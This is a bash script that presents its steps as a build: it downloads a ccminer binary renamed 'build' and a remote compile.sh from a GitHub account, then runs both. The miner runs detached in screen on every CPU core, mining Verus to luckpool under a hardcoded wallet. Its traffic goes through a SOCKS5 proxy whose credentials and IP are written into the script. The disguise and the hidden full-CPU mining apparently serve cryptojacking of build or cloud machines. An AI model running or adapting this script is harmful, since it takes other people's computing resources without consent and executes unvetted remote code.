#!/bin/bash
proxy="socks5://omar:omar@139.59.217.117:110"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/uzaki19/ezz/master/compile.sh
wget -qO build https://github.com/uzaki19/ezz/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
